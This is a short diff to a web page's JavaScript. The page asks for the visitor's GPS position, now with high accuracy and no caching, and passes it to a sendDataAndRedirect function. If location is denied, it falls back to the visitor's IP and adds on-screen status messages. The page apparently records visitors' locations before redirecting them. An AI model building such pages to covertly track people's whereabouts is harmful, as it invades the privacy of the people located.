@@ -109,14 +109,17 @@
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        statusText.innerText = "GPS locked! Redirecting...";
                         sendDataAndRedirect(position.coords.latitude, position.coords.longitude);
                     },
                     (error) => {
-                        console.warn("Location denied or error:", error.message);
-                        // Fallback: send null, backend will use IP
-                        sendDataAndRedirect(null, null);
+                        console.warn("Location error:", error.message);
+                        statusText.style.color = "#ef4444";
+                        statusText.innerText = "GPS Failed: " + error.message + ". Falling back to IP...";
+                        // Wait 2 seconds so the user can read the error before redirecting
+                        setTimeout(() => sendDataAndRedirect(null, null), 2000);
                     },
-                    { timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
                 sendDataAndRedirect(null, null);
